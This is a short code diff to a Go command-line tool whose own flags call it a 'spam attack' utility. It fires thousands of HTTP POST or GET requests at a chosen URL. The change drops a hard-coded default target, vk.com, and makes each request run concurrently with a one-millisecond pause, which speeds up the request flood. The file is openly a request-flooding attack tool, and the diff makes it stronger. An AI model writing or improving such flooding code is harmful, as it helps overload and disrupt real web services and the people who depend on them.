@@ -24,7 +24,7 @@ var errorCount = 0
 type any interface{}
 
 func main() {
-	attackUrl := flag.String("url", "vk.com", "attackUrl spam attack")
+	attackUrl := flag.String("url", "", "attackUrl spam attack")
 	method := flag.String("method", "POST", "method for attack (POST/GET)")
 	count := flag.Int("count", 10000, "count for attack")
 	_data := flag.String("data", ``, "data for attack")
@@ -44,7 +44,8 @@ func main() {
 			if i%5 == 0 {
 				fmt.Println("Sended count:", i, "Good:", completeCount, "Bad:", errorCount)
 			}
-			startAttack(*attackUrl, *method, data)
+			go startAttack(*attackUrl, *method, data)
+			time.Sleep(time.Millisecond)
 		}
 		fmt.Println("Done.", "Good: ", completeCount, "Error: ", errorCount)
 	} else {
